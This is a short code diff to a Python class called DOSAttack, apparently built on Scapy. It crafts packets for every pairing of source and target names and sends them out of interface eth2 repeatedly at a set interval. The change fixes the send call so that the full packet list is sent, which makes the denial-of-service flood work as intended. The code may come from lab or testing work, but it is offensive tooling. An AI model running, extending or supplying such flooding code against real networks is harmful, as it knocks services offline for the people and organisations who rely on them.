@@ -16,8 +16,10 @@ class DOSAttack:
         # TODO: Raw len vs pkt len - sorted, same.
         # TODO: IP flags,id ?
         # Hardcode for the time being
-        if cnt < len(src_list) * len(target_list):
-            cnt = len(src_list) * len(target_list)
+        # if cnt < len(src_list) * len(target_list):
+        
+        # send all possible combination of (src, dst), cnt times
+        # cnt = cnt * (len(src_list) * len(target_list))
         pkt_lst = []
         for target_name in target_list:
             for src_name in src_list:
@@ -35,7 +37,7 @@ class DOSAttack:
                 pkt.show2()
                 pkt_lst.append(pkt)
               
-        sendp(pkt, iface="eth2", count=cnt, inter=inter)
+        sendp(pkt_lst, iface="eth2", count=cnt, inter=inter)
 
 if __name__ == "__main__":
     attack = DOSAttack()
